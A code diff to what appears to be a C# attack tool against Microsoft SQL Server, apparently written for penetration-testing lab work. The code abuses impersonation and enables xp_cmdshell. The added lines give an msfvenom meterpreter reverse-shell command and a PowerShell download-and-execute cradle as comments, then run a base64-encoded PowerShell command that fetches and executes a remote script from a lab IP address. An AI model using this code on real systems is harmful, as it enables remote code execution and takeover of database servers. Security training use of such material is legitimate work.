@@ -90,6 +90,11 @@ namespace MSSQL
 			Console.WriteLine("[*] Triggered impersonation.");
 			res = executeQuery("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", con);
 			Console.WriteLine("[*] Enabled 'xp_cmdshell'.");
+			//msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.153 LPORT=8443 EXITFUNC=thread -f powershell
+			//$text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.153/run.txt') | IEX"
+			//$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
+			//$EncodedText = [Convert]::ToBase64String($bytes)
+			//$EncodedText
 			String cmd = "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA2ADcALwBjAGgAYQBwAHQAZQByADcALwByAHUAbgAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA=";
 			res = executeQuery($"EXEC xp_cmdshell '{cmd}'", con);
 			Console.WriteLine($"[*] Executed command! Result: {res}");
